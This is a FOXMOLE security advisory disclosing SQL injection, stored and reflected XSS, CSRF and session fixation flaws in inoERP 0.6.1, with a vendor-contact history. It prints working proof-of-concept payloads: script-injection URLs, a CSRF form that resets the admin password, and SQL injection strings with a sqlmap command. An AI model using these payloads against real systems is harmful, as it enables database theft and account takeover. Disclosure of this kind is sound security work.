@@ -1,0 +1,157 @@
+=== FOXMOLE - Security Advisory 2017-01-25 ===
+
+inoERP  - Multiple Issues
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Affected Versions
+=================
+inoERP 0.6.1
+
+Issue Overview
+==============
+Vulnerability Type: SQL Injection, Cross Site Scripting, Cross Site Request Forgery, Session Fixation
+Technical Risk: critical
+Likelihood of Exploitation: medium
+Vendor: inoERP
+Vendor URL: http://inoideas.org/  /  https://github.com/inoerp/inoERP
+Credits: FOXMOLE employee Tim Herres
+Advisory URL: https://www.foxmole.com/advisories/foxmole-2017-01-25.txt
+Advisory Status: Public
+OVE-ID: OVE-20170126-0002
+CVSS 2.0: 10.0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
+
+
+Impact
+======
+There are multiple SQL Injection vulnerabilities, exploitable without authentication.
+An attacker could use the SQL Injection to access the database in an unsafe way.
+This means there is a high impact to all applications.
+The inoERP software also lacks in input validation resulting in different reflected/stored XSS vulnerabilities.
+
+
+Issue Description
+=================
+The following findings are only examples, there are quite more. The whole application should be reviewed.
+
+All items tested using FF52.
+
+1.) Cross Site Scripting:
+Stored:
+Create a new Question in the -->Forum --> Ask a question
+Vulnerable fields : Title, Content
+Used Payload: Test<script>alert("xss")</script>
+
+Response:
+[...]
+ <title>Test<script>alert("xss")</script> - inoERP!</title>
+[...]
+
+The latest questions are included in the start page which means the entered payload gets executed directly in the start page.
+
+Reflected:
+With Auth:
+http://192.168.241.143/inoerp/form.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&mode=9&user_id=7
+http://192.168.241.143/inoerp/includes/json/json_blank_search.php?class_name=content&content_type_id=49&window_type=%22%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)
+%3C/scRipt%3E
+http://192.168.241.143/inoerp/program.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&program_name=prg_all_combinations&program_type=download_report
+
+Unauthenticated:
+http://192.168.241.143/inoerp/index.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)%3C/scRipt%3E
+
+2.) No protection against Cross Site Request Forgery Attacks:
+PoC: Changing the admin user credentials.
+
+<html>
+<body>
+    <form action="http://<IP>/inoerp/form.php?class_name=user" method="POST">
+      <input type="hidden" name="headerData&#91;0&#93;&#91;name&#93;" value="user&#95;id&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;0&#93;&#91;value&#93;" value="1" />
+      <input type="hidden" name="headerData&#91;1&#93;&#91;name&#93;" value="username&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;1&#93;&#91;value&#93;" value="inoerp" />
+      <input type="hidden" name="headerData&#91;2&#93;&#91;name&#93;" value="enteredPassword&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;2&#93;&#91;value&#93;" value="test" />
+      <input type="hidden" name="headerData&#91;3&#93;&#91;name&#93;" value="enteredRePassword&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;3&#93;&#91;value&#93;" value="test" />
+      <input type="hidden" name="headerData&#91;4&#93;&#91;name&#93;" value="first&#95;name&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;4&#93;&#91;value&#93;" value="inoerp" />
+      <input type="hidden" name="headerData&#91;5&#93;&#91;name&#93;" value="last&#95;name&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;5&#93;&#91;value&#93;" value="inoerp" />
+      <input type="hidden" name="headerData&#91;6&#93;&#91;name&#93;" value="email&#91;&#93;" />
+      <input type="hidden" name="headerData&#91;6&#93;&#91;value&#93;" value="inoerp&#64;no&#45;site&#46;com" />
+      <input type="hidden" name="headerData&#91;7&#93;&#91;name&#93;" value="phone&#91;&#93;" />
+[..snipped...]
+
+If a privileged user activates the request, the admin user id=1 is set to "test".
+
+3.) SQL Injection:
+Auth required:No
+#####
+http://192.168.241.143/inoerp/form.php?
+Parameter: module_code (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+    Payload: module_code=test' RLIKE (SELECT (CASE WHEN (2838=2838) THEN
+0x74657374 ELSE 0x28 END))-- qkmO
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
+GROUP BY clause (FLOOR)
+    Payload: module_code=test' AND (SELECT 8706 FROM(SELECT
+COUNT(*),CONCAT(0x716b7a6271,(SELECT
+(ELT(8706=8706,1))),0x7171626a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NPEq
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: module_code=test';SELECT SLEEP(5)#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: module_code=test' OR SLEEP(5)-- STgC
+
+Exploitable using e.g. SQLMAP
+
+Blind SQL Injection:
+sqlmap -u
+"http://192.168.241.143/inoerp/content.php?content_type%5b%5d=test&search_text=3&search_document_list%5b%5d=all"
+ -p "content_type%5b%5d" --dbms="MySQL"
+Parameter: content_type[] (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: content_type[]=-8366' OR 7798=7798 AND
+'eanR'='eanR&search_text=3&search_document_list[]=all
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: content_type[]=test' OR SLEEP(5) AND
+'exIO'='exIO&search_text=3&search_document_list[]=all
+#####
+
+4.) Session Fixation:
+After a successful login the SessionID PHPSESSID remains the same:
+Before Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2
+After Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2
+
+
+
+
+Temporary Workaround and Fix
+============================
+FOXMOLE advises to restrict the access to all vulnerable inoERP systems until all vulnerabilities are fixed.
+
+
+
+History
+=======
+2017-01-25  Issue discovered
+2017-01-26  Vendor contacted -> no response
+2017-02-20  Vendor contacted again -> no response
+2017-03-06  Vendor contacted again -> no response
+2017-03-27  Advisory Release
+
+
+GPG Signature
+=============
+This advisory is signed with the GPG key of the FOXMOLE advisories team.
+The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
